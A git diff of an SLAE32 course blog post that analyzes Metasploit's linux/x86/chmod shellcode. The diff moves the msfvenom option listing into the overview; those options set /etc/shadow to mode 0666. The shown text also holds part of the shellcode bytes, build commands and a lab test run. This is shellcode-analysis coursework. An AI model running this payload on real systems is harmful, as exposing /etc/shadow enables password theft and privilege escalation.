@@ -1,5 +1,5 @@
 ---
-title: SLAE32 Assignment 5.2 -- Analyzing MSFVenom `linux/x86/chmod` Shellcode
+title: SLAE32 Assignment 5.2 -- Analyzing chmod Shellcode
 date: 2019-9-15
 layout: single
 classes: wide
@@ -15,6 +15,22 @@ tags:
 --- 
 ![](/assets/images/SLAE32.png)
 ## Overview
+For the fifth assignment in the SLAE32 course we were tasked with analyzing three shellcodes from the Metasploit Framework.  
+In this blog post we will be analyzing the `linux/x86/chmod` payload.  
+This shellcode will change the permissions of the file `/etc/shadow` on the victims device allowing any and all users to read & write to the file.  
+There are much easier ways of creating an executable to test the shellcode than what is shown here. Instead we could have used the C program provided, output the shellcode into a file, or piped the payload to the analysis program.  
+The method of adding the shellcode to our own `JMP|Call|POP` Assembly program was used to gain a better grasp on the assembly concepts.  
+### Settings for the MSF chmod payload
+```console
+root# msfvenom --payload linux/x86/chmod --list-options
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+FILE  /etc/shadow      yes       Filename to chmod
+MODE  0666             yes       File mode (octal)
+
+Description:
+  Runs chmod on specified file with specified mode
+```
 
 ## Preparing the Shellcode for `gdb` & `disasm` Analysis
 ### Generating the `chmod` Shellcode
@@ -100,25 +116,14 @@ call_shellcode:
       0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
       0xcd,0x80
 ```
-### Compiling our `JMP|Call|POP` Shellcode
+### Compiling our JMP|Call|POP Shellcode
 ```console
 root# nasm -f elf32 jmpCallPop.nasm -o jmpCallPop.o
 root# ld jmpCallPop.o -o jmpCallPop
 ```
-### Testing our `chmod` Shellcode
-+ We can see what the `chmod` Shellcode will do with the command.
-+ We see that the default payload will change the file `/etc/shadow` to the permissions `rw-rw-rw-`.
-
+### Testing our chmod Shellcode
++ The payload will change the file `/etc/shadow` to the permissions `rw-rw-rw-`.
 ```console
-root# msfvenom --payload linux/x86/chmod --list-options
-Name  Current Setting  Required  Description
-----  ---------------  --------  -----------
-FILE  /etc/shadow      yes       Filename to chmod
-MODE  0666             yes       File mode (octal)
-
-Description:
-  Runs chmod on specified file with specified mode
-```
 root# ls -l /etc/shadow
 -rw-r----- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
 root# ./jmpCallPop
